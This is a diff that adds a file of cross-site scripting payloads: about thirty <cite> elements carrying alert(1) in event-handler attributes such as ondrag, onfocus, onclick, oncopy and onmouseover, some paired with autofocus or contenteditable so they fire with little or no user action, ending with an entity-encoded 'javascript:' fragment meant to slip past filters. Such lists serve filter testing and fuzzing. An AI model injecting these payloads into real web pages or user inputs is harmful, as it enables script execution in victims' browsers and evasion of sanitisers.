@@ -1,0 +1,33 @@
+<cite draggable="true" ondrag="alert(1)">test</cite>
+<cite draggable="true" ondragend="alert(1)">test</cite>
+<cite draggable="true" ondragenter="alert(1)">test</cite>
+<cite draggable="true" ondragleave="alert(1)">test</cite>
+<cite draggable="true" ondragstart="alert(1)">test</cite>
+<cite id=x tabindex=1 onactivate=alert(1)></cite>
+<cite id=x tabindex=1 onbeforeactivate=alert(1)></cite>
+<cite id=x tabindex=1 onbeforedeactivate=alert(1)></cite><input autofocus>
+<cite id=x tabindex=1 ondeactivate=alert(1)></cite><input id=y autofocus>
+<cite id=x tabindex=1 onfocus=alert(1)></cite>
+<cite id=x tabindex=1 onfocusin=alert(1)></cite>
+<cite onbeforecopy="alert(1)" contenteditable>test</cite>
+<cite onbeforecut="alert(1)" contenteditable>test</cite>
+<cite onbeforepaste="alert(1)" contenteditable>test</cite>
+<cite onblur=alert(1) tabindex=1 id=x></cite><input autofocus>
+<cite onclick="alert(1)">test</cite>
+<cite oncontextmenu="alert(1)">test</cite>
+<cite oncopy="alert(1)" contenteditable>test</cite>
+<cite oncut="alert(1)" contenteditable>test</cite>
+<cite ondblclick="alert(1)">test</cite>
+<cite onfocusout=alert(1) tabindex=1 id=x></cite><input autofocus>
+<cite onkeydown="alert(1)" contenteditable>test</cite>
+<cite onkeypress="alert(1)" contenteditable>test</cite>
+<cite onkeyup="alert(1)" contenteditable>test</cite>
+<cite onmousedown="alert(1)">test</cite>
+<cite onmouseenter="alert(1)">test</cite>
+<cite onmouseleave="alert(1)">test</cite>
+<cite onmousemove="alert(1)">test</cite>
+<cite onmouseout="alert(1)">test</cite>
+<cite onmouseover="alert(1)">test</cite>
+<cite onmouseup="alert(1)">test</cite>
+<cite onpaste="alert(1)" contenteditable>test</cite>
+c=\"javascript&#058;\";
